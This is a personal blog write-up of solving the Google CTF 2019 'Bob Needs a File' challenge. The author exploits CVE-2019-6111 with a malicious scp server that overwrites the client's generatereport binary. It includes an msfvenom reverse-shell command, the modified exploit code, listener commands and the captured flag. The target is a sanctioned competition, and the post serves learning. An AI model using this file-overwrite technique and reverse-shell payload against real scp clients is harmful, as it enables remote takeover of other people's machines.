---
layout: post
title: Google CTF 2019 - Bob Needs a File
---

Last year I regretted not participating in Google CTF and told myself I *needed* to participate the next time. Well, the next time arrived last weekend, and I managed to persuade some colleagues to create a team and join the fun.

After a busy and really fun weekend, we managed to get 3 flags. This is the write-up of how we captured one of them, the challenge `Bob Needs a File` of the `MISC` category!

## Poking around

The description of the challenge is the following:

~~~
It's like Google Drive, but better, maybe.

nc sc00p.ctfcompetition.com 1337
~~~

OK, so let's start by seeing what this `netcat` connection tells us:

~~~
$ nc sc00p.ctfcompetition.com 1337

Hi Alice,

Put in your ip address here and I'll pull the file from you on our usual ssh port and execute my job to call you back with the results.

Thanks,
Bob
~~~

Right. Sounds pretty straight-forward. Bob will ask us for a file at the IP we provide "on their usual ssh port", which we don't know, and then will execute some job with that file. At this point I was already guessing that the challenge would focus on either:

- a) returning a malicious file and exploit the "job" (whatever it was) to get the flag
- or b) exploiting an SSH client vulnerability (some of which I remembered were disclosed recently)

But first things first, let's discover at what port Bob is trying to connect to us.

~~~
$ sudo tcpdump -nn -i eth0 'port not 443 and port not 80 and port not 22 and tcp'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes

13:29:42.321607 IP 35.195.214.46.57194 > REDACTED.2222: Flags [S], seq 3225036092, win 28400, options [mss 1420,nop,nop,TS val 1286463866 ecr 0,nop,wscale 7], length 0
13:29:43.344451 IP 35.195.214.46.57194 > REDACTED.2222: Flags [S], seq 3225036092, win 28400, options [mss 1420,nop,nop,TS val 1286464889 ecr 0,nop,wscale 7], length 0
13:29:45.356523 IP 35.195.214.46.57194 > REDACTED.2222: Flags [S], seq 3225036092, win 28400, options [mss 1420,nop,nop,TS val 1286466901 ecr 0,nop,wscale 7], length 0
~~~

Great, he's using the 2222 port. Since he mentions the "ssh port" and he's requesting a file, we immediately thought of SFTP. After considering some options, we decided using [`paramiko`](https://www.paramiko.org/), a cool Python implementation of the SSH protocol. Luckily, `paramiko` offers some demos which we can modify to suit our needs instead of writing something from scratch. The [`demo_server.py`](https://github.com/paramiko/paramiko/blob/master/demos/demo_server.py) script seemed like a good starting point.

## Playing with paramiko

I still had in mind that the file requested by Bob needed to be crafted to exploit his job, but at this point I thought that maybe the whole thing was easier, and the flag could be the credentials sent by Bob to authenticate in the SSH server. So we modified the `demo_server` to:

- Listen on port 2222

~~~python
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("", 2222))
~~~

- Print out the provided username and password (if this is the method used to authenticate) and always authenticate correctly regardless of credentials

~~~python
def check_auth_password(self, username, password):
    print(username,password)
    return paramiko.AUTH_SUCCESSFUL
~~~

- Print out whatever the client sends to the server after authentication

~~~python
"""
server.event.wait(10)
if not server.event.is_set():
    print("*** Client never asked for a shell.")
    sys.exit(1)
"""

# ...

f = chan.makefile("rU")
username = f.readline().strip("\r\n")
print(username)
~~~

Also, some dependencies need to be installed for this script to work properly (even though we probably won't be using `gssapi`):

~~~
$ sudo apt-get install python-pip libkrb5-dev
$ pip3 install --user gssapi
~~~

OK, now we are set to go. Let's try to launch this server and give our IP to Bob again:

~~~
$ python3 demo_server.py 
Read key: 60733844cb5186657fdedaa22b5a57d5
Listening for connection ...
Got a connection!
bob 
Authenticated!
scp: 
~~~

And just like this, two of my hypothesis went right out the window: Bob was authenticating with a blank password (sad face) and he was using `scp`, not `SFTP`. Even worse, with our implementation of the SSH server, we weren't seeing the file being requested, so we couldn't serve it to see what happened next.

## `data.txt` and `generatereport`

At this point, a lot of googling, frustrated screams and saddening sobs happened. We tried to make `scp` work server-side with `paramiko`, but we were constantly hitting roadblocks. After a while, I desperately cried for help in our team chat, and one of our members suggested using [this amazing PoC for CVE-2019-6111 and CVE-2019-6110](https://www.exploit-db.com/exploits/46193). Even though we had thought of client-side SSH exploits, what interested us the most was the working `scp` server that returned any file that was requested. Yeah, umpteenth reminder that there are people out there way better than me at anything!

But well, let's give it a try! Just by changing the interface it listens on:

~~~python
sock.bind(('0.0.0.0', 2222))
sock.listen(0)
logging.info('Listening on port 2222...')
~~~

And giving our IP to Bob once more:

~~~
$ python3 46193.py 
INFO:root:Creating a temporary RSA host key...
INFO:root:Listening on port 2222...
INFO:root:Received connection from 34.76.117.194:38910
INFO:paramiko.transport:Connected (version 2.0, client OpenSSH_5.9p1)
INFO:paramiko.transport:Auth rejected (none).
INFO:root:Authenticated with bob:
INFO:paramiko.transport:Auth granted (password).
INFO:root:Opened session channel 0
INFO:root:Approving exec request: scp -f -- data.txt
INFO:root:Sending requested file "data.txt" to channel 0
INFO:root:Sending malicious file "exploit.txt" to channel 0
INFO:root:Covering our tracks by sending ANSI escape sequence
INFO:paramiko.transport:Disconnect (code 11): disconnected by user
~~~

Wow, just with that we see that `data.txt` is the file that Bob requests! And by pure luck it seems the exploit works too. It's just we don't know what we want to exploit with it just yet. But Bob said he would "come back to us" with the result of his "job", so let's listen for incoming connections again and see what happens:

~~~
$ sudo tcpdump -nn -i eth0 'port not 443 and port not 80 and port not 22 and tcp'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes

...

14:10:27.612236 IP 35.195.214.46.57610 > REDACTED.2223: Flags [S], seq 423611077, win 28400, options [mss 1420,nop,nop,TS val 1288908991 ecr 0,nop,wscale 7], length 0
14:10:27.612285 IP REDACTED.2223 > 35.195.214.46.57610: Flags [R.], seq 0, ack 423611078, win 0, length 0
~~~

After all the traffic to port 2222, we can see another connection from the same IP address to our port 2223. Let's listen on that port to see what Bob is trying to send us!

~~~
$ nc -lvvp 2223
Listening on [0.0.0.0] (family 0, port 2223)
Connection from 46.214.195.35.bc.googleusercontent.com 57648 received!
## generated by generatereport
## generatereport failed. Error: unknown
~~~

Hmmm. Ok, apparently some `generatereport` tool was executed with our `data.txt` and of course it failed because we didn't provide the proper file.

## CVE-2019-6111

Again, we googled a lot at this point to see what this `generatereport` was and how we could exploit it, maybe sending it a malicious `data.txt` file... And of course we found nothing. But then it clicked us.

We have a functional PoC of CVE-2019-6111 to overwrite additional files other than the one requested via `scp`. Why don't we try to overwrite that `generatereport`, whatever it is? (assuming it's in the same directory where `data.txt` is being requested!)

To confirm this, we firstly altered the exploit so that it sent an innocuous `generatereport` file to see what happened. And after setting the server up and speaking with Bob again, we happily checked that we no longer received the connection to port 2223 after Bob's `scp`. It seemed that our hypothesis was correct and `generatereport` was overwritten. Time to deliver a real payload!

~~~
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=REDACTED LPORT=2223 -f elf -o sploit
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: sploit
~~~

**Note:** We used port 2223 with our reverse shell to make sure the victim could go out through that port and no firewall would block us.

Once the malicious executable was set, we modified the exploit to deliver it instead of the default payload:

~~~python
with open('sploit', 'rb') as f:
    payload = f.read()

# ...

# This is CVE-2019-6111: whatever file the client requested, we send
# them 'exploit.txt' instead.
logging.info('Sending malicious file "generatereport to channel %d',
    channel.get_id())
command = 'C0664 {} generatereport\n'.format(len(payload)).encode('ascii')
~~~

The only thing left to do was to set the listener and cross our fingers:

~~~
$ nc -lvvp 2223
Listening on [0.0.0.0] (family 0, port 2223)
Connection from 170.101.195.35.bc.googleusercontent.com 34972 received!
id
uid=1337(user) gid=1337(user) groups=1337(user)

cat flag.txt
CTF{0verwr1teTh3Night}
~~~

I have to admit that, for the first 10 seconds, I couldn't believe it worked.

## Conclusion

This was not only a really fun challenge, but one of the few we managed to solve during the CTF, so it has a special place in our hearts. I'm aware we kind of stumbled on the solution, but we also paid the price with frustration and hours of tinkering, so there's that. The "overwrite the `generatereport` binary" part was a quite wild thought and seeing it actually working was amazing. Even thought we didn't get that many flags during the competition (and didn't get even near the top 10 teams that got qualified for the finals), this CTF weekend was a really great experience. I can't wait for the 2020 edition to try and improve our marks.

![Solved](/images/googlectf2019_bobneedsafile_solved.png)

Thanks for reading!
